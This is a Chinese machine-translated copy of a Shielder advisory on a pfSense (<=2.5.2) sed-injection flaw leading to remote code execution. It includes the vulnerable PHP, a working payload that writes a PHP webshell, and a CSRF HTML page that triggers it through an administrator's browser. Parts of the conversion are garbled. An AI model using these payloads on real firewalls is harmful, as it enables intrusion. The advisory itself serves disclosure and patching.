<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.shielder.it](https://www.shielder.it/advisories/pfsense-remote-command-execution/)

pfSense 中的远程代码执行 <= 2.5.2
=========================

概括
--

pfSense 允许经过身份验证的用户获取有关防火墙中设置的路由的信息。通过执行`netstat`实用程序检索信息，然后通过`sed`实用程序解析其输出。虽然命令注入的常见预防模式（即`escapeshellarg`参数的函数使用）正在使用中，但仍然可以注入`sed`特定代码并在任意位置写入任意文件。由于易受攻击的端点也容易受到跨站点请求伪造 (CSRF) 的攻击，因此也可以利用此漏洞进行预身份验证。

产品描述（来自供应商）
-----------

pfSense® Plus 软件是世界上最值得信赖的防火墙。该软件赢得了全球用户的尊重和喜爱——安装次数超过 300 万次。开源技术使之成为可能。由 Netgate 制成坚固、可靠、可靠的产品。

CVE(s)
------

*   [细节
    
    ### 根本原因分析
    
    pfSense 在尝试显示防火墙中设置的路由时，会`sed`使用一些用户可控的输入来执行实用程序。  
    `sed`- 流编辑器 - 是执行文本转换的强大实用程序，并且有相当多的命令可以定义为单个命令行参数，以分号分隔。在一个参数中添加多个命令的能力是此漏洞的关键。
    
    在深入研究利用细节之前需要说明的重要一点是 pfSense 基于 FreeBSD，因此所有 GNU 特定的参数`sed`（例如，可用于运行系统命令的`e`/参数）都不可用。`exec`
    
    ](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2021-41282</a></li>
    </ul>
    <h2 id=)
    
    [](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2021-41282</a></li>
    </ul>
    <h2 id=)[易受攻击代码](https://github.com/pfsense/pfsense/blob/a7086b04cae21ca742fdeefd1019ee1401b6dded/src/usr/local/www/diag_routes.php#L35-L65)的摘录如下：
    
    <table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code> 1
     2
     3
     4
     5
     6
     7
     8
     9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    </code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php">35  if (isset($_REQUEST['isAjax'])) {
    36  	require_once('auth_check.inc');
    37  
    38  	$netstat = "/usr/bin/netstat -rW";
    39  	if (isset($_REQUEST['IPv6'])) {
    40  		$netstat .= " -f inet6";
    41  		echo "IPv6\n";
    42  	} else {
    43  		$netstat .= " -f inet";
    44  		echo "IPv4\n";
    45  
    46  	}
    47  	if (!isset($_REQUEST['resolve'])) {
    48  		$netstat .= " -n";
    49  	}
    50  
    51  	if (!empty($_REQUEST['filter'])) {
    52  		$netstat .= " | /usr/bin/sed -e " . escapeshellarg("1,3d; 5,\$ { /" . htmlspecialchars($_REQUEST['filter']) . "/!d; };");
    53  	} else {
    54  		$netstat .= " | /usr/bin/sed -e '1,3d'";
    55  	}
    56  
    57  	if (is_numeric($_REQUEST['limit']) &amp;&amp; $_REQUEST['limit'] &gt; 0) {
    58  		$_REQUEST['limit']++;  // Account for the header line
    59  		$netstat .= " | /usr/bin/head -n {$_REQUEST['limit']}";
    60  	}
    61  
    62  	echo htmlspecialchars_decode(shell_exec($netstat));
    63  
    64  	exit;
    65  }
    </code></pre></td></tr></tbody></table>
    
    在第 51-52 行可以看出，如果请求包含`filter`参数，则其 HTML 特殊字符将转换为它们的 HTML 实体。然后输入通过一些硬编码的`sed`语法进行前缀和后缀，最后所有的东西都被[`escapeshellarg`](https://www.php.net/manual/en/function.escapeshellarg.php)函数转义，这样可以防止子命令或其他参数被注入。在第 62 行，命令最终被执行。
    
    如前所述，可以注入任意`sed`语法，唯一的限制是输入是通过[`htmlspecialchars`](https://www.php.net/manual/en/function.htmlspecialchars.php)函数编码的。这允许使用`s/match/replace/`命令将部分`netstat`输出替换为任意字符串，并允许使用命令将`w /path/to/file`命令的输出写入`sed`任意位置。
    
    将所有内容包装在一起，攻击者可以在 filter 参数中设置以下字符串： `.*/!d;};s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23` 这将导致运行以下命令：
    
    ```
    /usr/bin/netstat -rW -f inet | /usr/bin/sed -e '1,3d; 5,\$ { /!d;};s/Destination/\x3c\x3fphp system($_GET[\x22a\x22])\x3b\x3f\x3e/;w /usr/local/www/a.php
    #/!d; };' 
    ```
    
    由于`netstat`实用程序始终输出`Destination`字符串，因此选择将其替换为`<?php system($_GET["a"]);?>`，然后将输出写入`/usr/local/www/a.php`.
    
    ### 概念证明
    
    1.  登录 pfSense
    2.  `<target>`通过替换为目标 pfSense 实例的 IP 地址/域来访问以下 URL ：`http://<target>/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23`
    3.  通过替换为目标 pfSense 实例的 IP 地址/域来访问以下 URL，`<target>`并注意该`id`命令已被执行：`http://<target>/a.php?a=id`
    
    ### 影响
    
    经过身份验证的攻击者可以将任意文件写入 pfSense 磁盘。这可以被滥用来编写一个 webshel​​l 来执行任意代码/命令。
    
    应该注意的是，由于缺乏针对易受攻击的端点的跨站点请求伪造 (CSRF) 保护，攻击者可能会欺骗经过身份验证的管理员访问恶意网站，以通过受害者的会话/浏览器利用该漏洞。跨站点请求伪造咨询中提供了更多详细信息。
    
    通过 CSRF 利用漏洞的概念证明如下：
    
    1.  登录 pfSense
    2.  `<target>`通过替换为目标 pfSense 实例的 IP 地址/域来创建具有以下内容的 HTML 文件：
    
    <table class="lntable"><tbody><tr><td class="lntd"><pre tabindex="0" class="chroma"><code>1
    2
    3
    4
    </code></pre></td><td class="lntd"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">&lt;meta &gt;
    &lt;script&gt;
    window.location = "http://&lt;target&gt;/diag_routes.php?isAjax=1&amp;filter=.*/!d;};s/Destination/\\x3cscript\\x3eif\\x28location.pathname\\x21\\x3d\\x27\\x2fa.php\\x27\\x29\\x7blocation\\x3d\\x27\\x2fa.php\\x3fa\\x3did\\x27\\x7d\\x3c\\x2fscript\\x3e\\x3c\\x3fphp+system($_GET[\\x22a\\x22])\\x3b\\x3f\\x3e/;w+/usr/local/www/a.php%0a%23"
    &lt;/script&gt;
    </code></pre></td></tr></tbody></table>
    
    3.  `<target>`通过替换为目标 pfSense 实例的 IP 地址/域来访问以下 URL，并注意 404 错误：`http://<target>/a.php?a=id`
    4.  在网络服务器上托管在步骤 2 中创建的 HTML 页面，并在用于其他步骤的同一浏览器中访问它
    5.  请注意，Arbitrary File Write 已被利用在其中创建 webshel​​l，`/usr/local/www/a.php`受害者被重定向到 webshel​​l ( `http://<target>/a.php?a=id`) 以执行`id`命令
    
    ### 整治
    
    将 pfSense CE 升级到 2.6.0 版或将 pfSense Plus 升级到 22.01 版。
    
    披露时间表
    -----
    
    *   2021 年 12 月 8 日：提交至[security@netgate.com](mailto:security@netgate.com)
    *   13/08/2021：pfSense 在 Github 上发布了 RCE 的修复：[https ://github.com/pfsense/pfsense/commit/72ea2b69cc111d4bc8ebf1ccf1e1529923c5b88a](https://github.com/pfsense/pfsense/commit/72ea2b69cc111d4bc8ebf1ccf1e1529923c5b88a)
    *   2021 年 8 月 16 日：Shielder 在已实施的修复中报告了 ReDoS，并且缺少针对 CSRF 的修复
    *   16/08/2021：pfSense 在 Github 上发布了修复 ReDoS 和 CSRF 的第一次尝试：[https ://github.com/pfsense/pfsense/commit/57a737f172b7baaa6ae0f23e8aef2f93ad851054](https://github.com/pfsense/pfsense/commit/57a737f172b7baaa6ae0f23e8aef2f93ad851054)
    *   2021 年 8 月 17 日：Shielder 报告绕过 ReDoS 修复
    *   17/08/2021：pfSense 在 Github 上发布了修复 ReDos 的第二次尝试：[https ://github.com/pfsense/pfsense/commit/8cd3f92f2443a6f0e4b7964a9532f761f808a0c6](https://github.com/pfsense/pfsense/commit/8cd3f92f2443a6f0e4b7964a9532f761f808a0c6)
    *   2021 年 8 月 17 日：Shielder 报告了 ReDoS 修复的又一个绕过™️
    *   18/08/2021：pfSense 在 Github 上发布了 ReDoS 的最终修复：[https ://github.com/pfsense/pfsense/commit/cf757a8094762ede47861fc073eaba06355c6bfc](https://github.com/pfsense/pfsense/commit/cf757a8094762ede47861fc073eaba06355c6bfc)
    *   2021 年 9 月 15 日：Shielder 请求 CVE
    *   06/10/2021: Shielder 要求更新固定版本的发布时间
    *   2021 年 6 月 10 日：pfSense 共享了更新的 ETA - 2022 年 1 月
    *   14/02/2022：psSense 发布了固定版本
    *   23/02/2022：Shielder 的建议公开
    
    学分
    --
    
    *   Abdel Adim ` [smaury](https://twitter.com/smaury92) ` Shielder Oisfi
    
    该公告首次发布于 https://www.shielder.it/advisories/pfsense-remote-command-execution/